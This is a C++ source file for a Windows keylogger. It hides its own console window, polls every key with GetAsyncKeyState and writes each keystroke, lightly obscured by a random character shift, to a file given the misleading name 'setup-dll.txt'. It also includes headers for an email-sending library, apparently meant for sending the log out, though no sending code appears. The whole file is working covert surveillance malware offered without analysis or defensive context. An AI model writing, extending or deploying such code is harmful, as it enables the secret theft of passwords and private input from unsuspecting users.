#include <iostream>
#include <fstream>
//#include <cstdlib>
#include <ctime>
#include <conio.h>
#include <streambuf>
#include <Windows.h>
#include "easendmailobj.tlh"
#include "easendmailobj.tli"

using namespace std;
fstream ifile;
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}


void encrypt_file() {

	int decrypt;
	ifile.open("setup-dll.txt");
	ifile >> decrypt;
	char temp;

	for (; !ifile.eof();) {
		temp = ifile.get();
		temp = temp - decrypt;
		cout << temp;
	}
}
int main() {

	Stealth();
	/*HWND hwnd = ::GetConsoleWindow();
	if (hwnd != NULL)
	{
		HMENU hMenu = ::GetSystemMenu(hwnd, FALSE);
		if (hMenu != NULL) DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
	}*/
	//FreeConsole();
	//AttachConsole();
	/*if (FreeConsole() == 0) {
		MessageBox(NULL, "FreeConsole failed", "", MB_OK);
	}*/
	//Sleep(10);
	srand(time(0));
	int encrypt = rand() % 26;
	if (encrypt == 0) {
		encrypt = 23;
	}

	ifile.open("setup-dll.txt", std::ofstream::out | std::ofstream::in| std::fstream::trunc);
	ifile << encrypt;
	ifile << " ";

	int itr = 0;

	while (1) {
		for (int i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {

				if (char(i) == '1') {
					return 0;
				}

				i += encrypt;
				ifile << char(i);
				
				//cout << i << endl;
			}
		}
	}
	ifile.close();
	//encrypt_file();
}